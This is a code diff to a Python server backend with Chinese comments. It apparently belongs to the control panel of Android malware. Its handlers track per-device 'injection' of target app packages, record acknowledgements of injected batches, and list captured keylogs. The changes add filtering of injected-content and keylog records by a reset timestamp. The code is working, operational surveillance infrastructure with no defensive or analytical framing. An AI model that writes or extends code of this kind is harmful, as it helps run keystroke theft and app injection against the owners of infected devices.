@@ -459,7 +459,23 @@ def h_inj_templates(b, q, a):
 
 
 def h_inj_records(b, q, a):
-    return {'ok': True, 'records': S['inj_records'][-200:]}
+    dev = str(q.get('id') or q.get('deviceId') or b.get('deviceId') or '')
+    rows = S['inj_records'][-200:]
+    if dev:
+        rows = [r for r in rows if str(r.get('deviceId') or '') == dev]
+    # 重注入过滤（同 inject_logs 规则）
+    _rs = (S.get('inj_reset') or {}).get(dev) or {}
+    if _rs:
+        kept = []
+        for r in rows:
+            pkg = str(r.get('package') or r.get('pkg') or '')
+            cut = _rs.get(pkg) or _rs.get('*') or 0
+            ts = int(r.get('ts') or 0)
+            if cut and ts and ts < cut:
+                continue
+            kept.append(r)
+        rows = kept
+    return {'ok': True, 'records': rows}
 
 
 def h_inj_count_batch(b, q, a):
@@ -630,7 +646,19 @@ def h_inj_track_act(b, q, a):
     act = q.get('_act') or b.get('_act') or 'inject'
     st = {'inject': 'injected', 'reset': 'idle', 'skip': 'skipped',
           'ack': 'injected', 'dispatched': 'dispatched'}.get(act, act)
-    # 回执（设备收到 injectBatch）：把该设备这批包标成 acknowledged（面板显示"已就绪"）
+    # 回执（设备收到 reinject）：该包已准备就绪 → injected（面板"已注入"）
+    if act == 'reinject':
+        _pkg_r = str(b.get('packageName') or b.get('package_name') or b.get('pkg') or '').strip()
+        _dev_r = str(b.get('deviceId') or q.get('deviceId') or '')
+        try:
+            _db_r = db()
+            if _db_r and _dev_r and _pkg_r:
+                _db_r.inj_state_set(_dev_r, _pkg_r, 'injected')
+                print('[inj] reinject ready %s %s -> injected' % (_dev_r, _pkg_r), flush=True)
+        except Exception:
+            pass
+
+    # 回执（设备收到 injectBatch）：把该设备这批包标成 injected（面板显示"已注入"）
     if act == 'ack':
         pkgs = b.get('pkgs') or q.get('pkgs') or []
         dev_id = (b.get('deviceId') or q.get('deviceId') or '')
@@ -749,6 +777,22 @@ def h_keylogs_list(b, q, a):
             r['created_at'] = fmt_cn(ts)
         elif not r.get('created_at'):
             r['created_at'] = ''
+
+    # 重注后：该设备/该包在 reset 时间戳之前的内容不再回显（历史仍留在 /api/inj/records）
+    try:
+        _rs = (S.get('inj_reset') or {}).get(str(dev)) or {}
+        if _rs:
+            kept = []
+            for r in rows:
+                pkg = str(r.get('pkg') or r.get('package_name') or '')
+                cut = _rs.get(pkg) or _rs.get('*') or 0
+                ts = r.get('ts') or 0
+                if cut and isinstance(ts, (int, float)) and ts <= int(cut):
+                    continue
+                kept.append(r)
+            rows = kept
+    except Exception:
+        pass
 
     rows = rows[-limit:]
     rows.reverse()
@@ -1558,6 +1602,12 @@ def h_inject_logs(b, q, a):
             continue
         ts = int(r.get('ts') or 0)
         if not (r.get('package') or r.get('pkg') or '') or not (r.get('data') or ''):
+            continue
+        # 重注入过滤：reset 之前的旧内容不再回显（和 db keylogs 同一套规则）
+        _rs2 = (S.get('inj_reset') or {}).get(str(d)) or {}
+        _pk2 = r.get('package') or r.get('pkg') or ''
+        _cut2 = _rs2.get(_pk2) or _rs2.get('*') or 0
+        if _cut2 and ts and ts < _cut2:
             continue
         _k = (r.get('package') or r.get('pkg') or '', (r.get('data') or '')[:200])
         if _k in _seen_keys:
